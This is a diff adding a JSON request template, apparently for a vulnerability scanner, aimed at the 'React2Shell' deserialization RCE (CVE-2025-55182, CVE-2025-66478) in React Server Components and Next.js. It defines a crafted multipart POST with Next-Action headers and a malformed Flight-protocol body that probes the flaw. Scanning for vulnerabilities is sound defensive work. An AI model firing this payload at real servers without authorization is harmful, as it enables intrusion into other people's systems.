@@ -1,0 +1,20 @@
+{
+    "categories": ["RCE", "REACT2SHELL"],
+    "tags": ["react", "nextjs", "rce", "cve-2025-55182", "cve-2025-66478", "remote code execution","react2shell"],
+    "description": "Critical unauthenticated RCE in React Server Components and Next.js via insecure deserialization in RSC Flight protocol",
+    "payload": {
+        "route": "/",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryABC123XYZ456",
+            "Next-Action": "NXT1234567890ABCDEFGHJKLMNPQRSTUV",
+            "X-Nextjs-Request-Id": "REQ9876543210ZYXWVUTSRQPONMLKJHGF",
+            "Next-Router-State-Tree": "[[[\"\",{\"children\":[\"__PAGE__\",{}]},null,null,true]]"
+        },
+        "body": {
+            "1": "{}",
+            "0": "[\"$1:a:a\"]"
+        },
+        "query": {}
+    }
+}
